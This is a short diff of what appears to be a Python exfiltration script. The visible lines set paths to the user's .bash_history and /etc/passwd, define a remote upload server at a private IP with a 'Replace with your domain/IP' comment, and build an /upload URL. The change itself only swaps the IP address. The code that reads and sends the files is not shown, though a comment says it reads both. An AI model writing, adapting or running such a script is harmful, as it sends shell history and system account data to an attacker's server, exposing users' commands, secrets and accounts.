@@ -12,7 +12,7 @@ target_file_path = os.path.join(user_home, ".bash_history")
 passwd_file_path = "/etc/passwd"
 
 # Server details
-host = "10.2.0.7:5000"   # Replace with your domain/IP
+host = "10.2.0.9:5000"   # Replace with your domain/IP
 server_url = f"http://{host}/upload"
 
 # Function to read the entire file (both history and passwd)
